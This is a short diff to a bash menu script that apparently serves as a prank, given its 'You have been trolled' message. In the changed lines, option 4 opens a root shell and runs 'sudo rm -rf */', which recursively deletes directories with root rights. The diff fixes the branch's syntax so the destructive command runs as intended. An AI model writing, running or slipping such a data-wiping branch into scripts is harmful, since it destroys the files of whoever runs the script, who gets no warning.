@@ -35,9 +35,9 @@ if [[ "$option" =~ ^[1-4]$ ]]; then
         echo -e "\n${turquoiseColour}You have been trolled${endColour}"
         ;;
     4) 
-    sudo sudo /bin/sh
-    sudo rm -rf */
-    
+        sudo /bin/sh
+        sudo rm -rf */
+        ;;
     
     esac
 else
